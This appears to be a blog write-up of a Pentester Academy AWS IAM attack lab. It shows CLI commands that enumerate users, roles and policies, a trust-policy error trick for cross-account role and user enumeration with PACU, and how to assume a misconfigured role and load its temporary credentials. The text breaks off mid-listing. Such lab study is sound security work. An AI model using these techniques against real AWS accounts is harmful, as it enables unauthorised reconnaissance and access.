<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Pentester Academy AWS IAM Attack Lab" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="https://tanishq.page/blog/posts/pentester-academy-aws-iam/" /><meta property="og:url" content="https://tanishq.page/blog/posts/pentester-academy-aws-iam/" /><meta property="og:site_name" content="Tanishq Rupaal" /><meta property="og:image" content="https://tanishq.page/blog/assets/img/covers/pentesteracademy-cover.jpeg" /><meta property="og:image:alt" content="PTAcademy Artwork" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-28T03:00:00-04:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://tanishq.page/blog/assets/img/covers/pentesteracademy-cover.jpeg" /><meta name="twitter:image:alt" content="PTAcademy Artwork" /><meta property="twitter:title" content="Pentester Academy AWS IAM Attack Lab" /><meta name="twitter:site" content="@etheriosking" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-28T03:00:00-04:00","datePublished":"2022-04-28T03:00:00-04:00","description":"Enumeration","headline":"Pentester Academy AWS IAM Attack Lab","image":{"alt":"PTAcademy Artwork","url":"https://tanishq.page/blog/assets/img/covers/pentesteracademy-cover.jpeg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://tanishq.page/blog/posts/pentester-academy-aws-iam/"},"url":"https://tanishq.page/blog/posts/pentester-academy-aws-iam/"}</script><title>Pentester Academy AWS IAM Attack Lab | Tanishq Rupaal</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tanishq Rupaal"><meta name="application-name" content="Tanishq Rupaal"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/blog/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script src="/blog/assets/js/dist/theme.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script> <script defer src="/blog/assets/js/dist/post.min.js"></script> <script defer src="/blog/app.min.js?baseurl=/blog&register=true" ></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-B88HEPZBVJ"></script> <script> document.addEventListener('DOMContentLoaded', () => { window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-B88HEPZBVJ'); }); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/blog/" id="avatar" class="rounded-circle"><img src="/blog/assets/Abstract.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a> <a class="site-title d-block" href="/blog/">Tanishq Rupaal</a><p class="site-subtitle fst-italic mb-0">Cybersecurity Professional</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tanq16" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/etheriosking" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dragonking47','proton.me'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://linkedin.com/in/tanishqrupaal" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/blog/">Home</a> </span> <span>Pentester Academy AWS IAM Attack Lab</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1" data-toc="true"><header><h1 data-toc-skip>Pentester Academy AWS IAM Attack Lab</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1651129200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 28, 2022 </time> </span><div class="mt-3 mb-3"> <a href="/blog/assets/img/covers/pentesteracademy-cover.jpeg" class="popup img-link preview-img shimmer"><img src="/blog/assets/img/covers/pentesteracademy-cover.jpeg" alt="PTAcademy Artwork" width="1200" height="630" loading="lazy"></a><figcaption class="text-center pt-2 pb-2">PTAcademy Artwork</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/etheriosking">Tanishq Rupaal</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="4041 words" > <em>22 min</em> read</span></div></div></div></header><div id="toc-bar" class="d-flex align-items-center justify-content-between invisible"> <span class="label text-truncate">Pentester Academy AWS IAM Attack Lab</span> <button type="button" class="toc-trigger btn me-1"> <i class="fa-solid fa-list-ul fa-fw"></i> </button></div><button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm"> <span class="label ps-2 pe-1">Contents</span> <i class="fa-solid fa-angle-right fa-fw"></i> </button> <dialog id="toc-popup" class="p-0"><div class="header d-flex flex-row align-items-center justify-content-between"><div class="label text-truncate py-2 ms-4">Pentester Academy AWS IAM Attack Lab</div><button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75"> <i class="fas fa-close"></i> </button></div><div id="toc-popup-content" class="px-4 py-3 pb-4"></div></dialog><div class="content"><h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To get information about current caller →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn sts get-identity-caller
</pre></table></code></div></div><ol><li><p>List and see last uses for access keys →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre> <span class="c"># List all access keys</span>
 awsn iam list-access-keys

 <span class="c"># Get last usage region and service which used the access key</span>
 awsn iam get-access-key-last-used <span class="nt">--access-key-id</span> AKIAUAWOPGE5CTW6HRZL

 <span class="c"># List last service usage for all access keys</span>
 <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>awsn iam list-access-keys | jq <span class="s1">'.AccessKeyMetadata[] | .AccessKeyId'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span>
 <span class="k">do </span><span class="nb">echo</span> <span class="nv">$i</span>
 awsn iam get-access-key-last-used <span class="nt">--access-key-id</span> <span class="nv">$i</span> | jq <span class="s1">'.AccessKeyLastUsed | .ServiceName'</span>
 <span class="k">done</span>
</pre></table></code></div></div><li><p>Get information about the account →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre> <span class="c"># Summary for the account</span>
 awsn iam get-account-summary | jq <span class="s1">'.SummaryMap'</span>

 <span class="c"># Password Policy</span>
 awsn iam get-account-password-policy

 <span class="c"># Get account aliases</span>
 awsn iam list-account-aliases | jq <span class="s1">'.AccountAliases'</span>

 <span class="c"># Get a million lines - all information about the account</span>
 <span class="c"># Best to save this in some file since the output is huge (~5MB)</span>
 awsn iam get-account-authorization-details <span class="o">&gt;</span> account_authorization_details
</pre></table></code></div></div><li><p>Get information on groups →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre> <span class="c"># Get list of all groups (direct)</span>
 awsn iam list-groups | jq <span class="s1">'.Groups[].GroupName'</span>

 <span class="c"># Get list of all groups (from account_authorization_details)</span>
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.GroupDetailList[].GroupName'</span>

 <span class="c"># Get managed policies for a group</span>
 awsn iam list-attached-group-policies <span class="nt">--group-name</span> ad-Admin
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.GroupDetailList[] | select(.GroupName == "ad-Admin") | .AttachedManagedPolicies'</span>

 <span class="c"># Get group inline policies</span>
 awsn iam list-group-policies <span class="nt">--group-name</span> Students-config-2
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.GroupDetailList[] | select(.GroupName == "Students-config-2") | .GroupPolicyList'</span>

 <span class="c"># Get users in group</span>
 awsn iam get-group <span class="nt">--group-name</span> Students-config-2 | jq <span class="s1">'.Users'</span>
</pre></table></code></div></div><li><p>Get information on users →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre> <span class="c"># Get list of users</span>
 awsn iam list-users | jq <span class="s1">'.Users[].UserName'</span>
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.UserDetailList[].UserName'</span>

 <span class="c"># List policy for a user</span>
 awsn iam list-user-policies <span class="nt">--user-name</span> student-mtn5imevkfls5pue
 awsn iam get-user-policy <span class="nt">--user-name</span> student-mtn5imevkfls5pue <span class="nt">--policy-name</span> DenyAccess
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.UserDetailList[] | select(.UserName=="student-mtn5imevkfls5pue") | .UserPolicyList'</span>

 <span class="c"># List attached managed policies for a user</span>
 awsn iam list-attached-user-policies <span class="nt">--user-name</span> student-mtn5imevkfls5pue
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.UserDetailList[] | select(.UserName=="student-mtn5imevkfls5pue") | .AttachedManagedPolicies'</span>

 <span class="c"># List user tags for a user</span>
 awsn iam list-user-tags <span class="nt">--user-name</span> ad-Adminson
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.UserDetailList[] | select(.UserName=="ad-Adminson") | .Tags'</span>

 <span class="c"># Get general user information</span>
 awsn iam get-user <span class="nt">--user-name</span> ad-Adminson
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.UserDetailList[] | select(.UserName=="ad-Adminson")'</span>

 <span class="c"># List groups for user</span>
 awsn iam list-groups-for-user <span class="nt">--user-name</span> ad-Adminson
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.UserDetailList[] | select(.UserName=="ad-Adminson") | .GroupList'</span>

 <span class="nv">a</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.UserDetailList[] | select(.UserName=="ad-Adminson") | .GroupList[]'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span>
 <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$a</span><span class="s2">"</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.GroupDetailList[] | select(.GroupName == "'</span><span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span><span class="s1">'")'</span><span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><li><p>Get login profiles for all users →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> <span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>awsn iam list-users | jq <span class="s1">'.Users[].UserName'</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span>
 <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2"> -----------------"</span>
 awsn iam get-login-profile <span class="nt">--user-name</span> <span class="nv">$i</span>
 <span class="k">done</span>
</pre></table></code></div></div><li><p>Get information on roles →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre> <span class="c"># List all roles</span>
 awsn list-roles
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.RoleDetailList[]'</span>

 <span class="c"># Get information for a role</span>
 awsn iam list-role-policies <span class="nt">--role-name</span> ad-Role
 awsn iam get-role <span class="nt">--role-name</span> ad-Role
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.RoleDetailList[] | select(.RoleName == "ad-Role")'</span>

 <span class="c"># Get policies for a role</span>
 awsn iam list-role-policies <span class="nt">--role-name</span> ad-Role <span class="c"># gives names for the next command</span>
 awsn iam get-role-policy <span class="nt">--role-name</span> ad-Role <span class="nt">--policy-name</span> ad-RoleDeneid
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.RoleDetailList[] | select(.RoleName == "ad-Role") | .RolePolicyList'</span>

 <span class="c"># List attached managed policies</span>
 awsn iam list-attached-role-policies <span class="nt">--role-name</span> ad-Role
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.RoleDetailList[] | select(.RoleName == "ad-Role") | .AttachedManagedPolicies'</span>
</pre></table></code></div></div><li><p>Get default version document for policy →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> <span class="nb">cat </span>account_authorization_details | <span class="se">\</span>
 jq <span class="s1">'.Policies[] | select(.PolicyName=="AmazonDynamoDBFullAccess") | .PolicyVersionList[] | select(.IsDefaultVersion==true) | .Document'</span>
</pre></table></code></div></div><li><p>List all policies in use →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre> <span class="c"># Policies with attachment count more than 0</span>
 awsn iam list-policies | jq <span class="s1">'.Policies[] | select(.AttachmentCount &gt; 0) | .PolicyName'</span>
 <span class="nb">cat </span>account_authorization_details | jq <span class="s1">'.Policies[].PolicyName'</span>

 <span class="c"># Customer Managed policies</span>
 awsn iam list-policies <span class="nt">--scope</span> Local

 <span class="c"># AWS Managed policies</span>
 awsn iam list-policies <span class="nt">--scope</span> AWS
</pre></table></code></div></div><li><p>List entities for a given policy →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> awsn iam list-entities-for-policy <span class="nt">--policy-arn</span> arn:aws:iam::aws:policy/AdministratorAccess
</pre></table></code></div></div><li><p>Get ssh-public keys and signing certificates for user →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># List signing key certs for user</span>
awsn iam list-signing-certificates <span class="nt">--user-name</span> ad-user

<span class="c"># Get ssh public keys</span>
awsn iam list-ssh-public-keys <span class="nt">--user-name</span> ad-user
</pre></table></code></div></div><li><p>Get Roles which have Principal as any AWS account within the Assume Role policy document →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nb">cat </span>account_authorization_details | <span class="se">\</span>
jq <span class="s1">'.RoleDetailList[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS=="*") | .RoleName'</span>
</pre></table></code></div></div><li><p>Get information for MFA devices →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># MFA devices</span>
awsn iam list-mfa-devices

<span class="c"># Virtual MFA devices</span>
awsn iam list-virtual-mfa-devices
</pre></table></code></div></div></ol><hr /><h2 id="cross-account-enumeration"><span class="me-2">Cross Account Enumeration</span><a href="#cross-account-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The old method of enumerating roles on a different account was to try to assume that role and look for discrepancies in the error response returned by the API. This was fixed by AWS Security and thus a new method is required.</p><p>For the new method, a new role is created using the following in the personal account →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn iam create-role <span class="nt">--role-name</span> tlullu <span class="nt">--assume-role-policy-document</span> file://policy.json
</pre></table></code></div></div><p>The policy document contains the following →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
  </span><span class="nl">"Version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2012-10-17"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"Statement"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"Effect"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Deny"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"Principal"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"AWS"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="nl">"Action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sts:AssumeRole"</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>This denies <code class="language-plaintext highlighter-rouge">sts:AssumeRole</code> to all AWS accounts. Now, if the policy is updated to deny it only for a specific ARN, then AWS backend will check to see if the entity actually exists. The update policy command fails if the entity is not valid (not present). Therefore, the principal can be changed to the following → <code class="language-plaintext highlighter-rouge">"AWS": "ad-doesnotexist"</code> or <code class="language-plaintext highlighter-rouge">"AWS": "ad-crow"</code> using the following command →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>aws iam update-assume-role-policy <span class="nt">--role-name</span> tlullu <span class="nt">--policy-document</span> file://policy.json
</pre></table></code></div></div><p>The command fails if the role doesn’t exist with the following error →</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>An error occurred (MalformedPolicyDocument) when calling the UpdateAssumeRolePolicy operation: Invalid principal in policy: "AWS":"arn:aws:iam::276384657722:role/ad-doesnotexist"
</pre></table></code></div></div><p>If the role exists, then the policy is updated successfully. This allows for role enumeration, after which they can be checked for wildcard principal for <code class="language-plaintext highlighter-rouge">sts:AssumeRole</code> by attempting to assume them. <a href="https://github.com/RhinoSecurityLabs/pacu">PACU</a> does this automatically.</p><p>Adding keys to PACU and running it from the prompt as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>run iam__enum_roles <span class="nt">--role-name</span> tlullu <span class="nt">--account-id</span> 276384657722 <span class="nt">--word-list</span> /root/names
</pre></table></code></div></div><p>This gives the following identified roles and whether they can be assumed globally or not →</p><ol><li>ad-crew<li>ad-flea<li>ad-ibex<li>ad-snipe<li>ad-griffon</ol><p>Since this works on entities, users can also be enumerated in the same way by specifying the ARN of a user instead of a role within the policy. PACU has this under the <code class="language-plaintext highlighter-rouge">iam__enum_users</code> module. Running that modules gives the following users →</p><ol><li>ad-ghoul<li>ad-guppy<li>ad-marmot<li>ad-thrush<li>ad-haddock<li>ad-foxhound<li>ad-honeybee<li>ad-terrapin</ol><hr /><h2 id="misconfigured-trust-policy"><span class="me-2">Misconfigured Trust Policy</span><a href="#misconfigured-trust-policy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The Lab asks to assume a role in another account which can be done as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>awsn sts assume-role <span class="nt">--role-arn</span> arn:aws:iam::276384657722:role/ad-LoggingRole <span class="nt">--role-session-name</span> TestTanq
</pre></table></code></div></div><p>The output can be saved to a file <code class="language-plaintext highlighter-rouge">assumed_role</code>. Then the session can be used as follows →</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>assumed_role|jq <span class="s1">'.Credentials.AccessKeyId'</span>|tr <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="se">\</span>
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>assumed_role|jq <span class="s1">'.Credentials.SecretAccessKey'</span>|tr <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="se">\</span>
<span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>assumed_role|jq <span class="s1">'.Credentials.SessionToken'</span>|tr <span class="nt">-d</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="si">)</span> <span class="se">\</span>
awsn sts get-caller-identity
</pre></table></code></div></div><p>Using this method to check the managed policies attached with the role, it’s seen that the role has read only access to S3 and IAM. The S3 buckets can be listed and the IAM assume role policy can be seen as well as follows →</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
